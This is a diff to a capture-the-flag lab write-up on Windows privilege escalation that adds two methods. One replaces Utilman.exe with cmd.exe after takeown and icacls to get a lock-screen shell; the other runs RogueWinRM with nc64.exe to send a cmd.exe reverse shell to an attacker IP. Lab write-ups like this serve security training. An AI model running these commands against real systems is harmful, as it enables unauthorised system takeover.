@@ -695,6 +695,8 @@ Using any of the three methods discussed in this task, gain access to the Admini
 
 	`THM{SEFLAGPRIVILEGE}`
 
+	#### SeBackup / SeRestore method
+
 	* Check our privileges
 	
 		![task6-check](./images/task6-check.png)
@@ -742,6 +744,45 @@ Using any of the three methods discussed in this task, gain access to the Admini
 	
 		![task6-flag](./images/task6-flag.png)
 
+	#### SeTakeOwnership method
+	
+	* Take ownership of the service's executable
+	
+		```
+		takeown /f C:\Windows\System32\Utilman.exe
+		icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+		copy cmd.exe utilman.exe
+		```
+
+		![task6-takeown-set](./images/task6-takeown-set.png)
+
+	* Lockout and click Ease of access
+	
+		![task6-grantaccess](./images/task6-grantaccess.png)
+
+	* Get the flag
+		
+		![task6-flag](./images/task6-flag.png)
+
+	#### SeImpersonate / SeAssignPrimaryToken method
+	
+	* Open link via browsert `http://10.10.29.42`
+	
+		![task6-browser](./images/task6-browser.png)
+
+	* Set listener
+	
+		![task6-listener](./images/task6-listener.png)
+
+	* Run script & get shell
+	
+		`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.13.52.88 7777"`
+
+		![task6-script](./images/task6-script.png)
+
+	* Get the flag
+		
+		![task6-flag](./images/task6-flag.png)
 
 ## Task 7 - Abusing vulnerable software
 
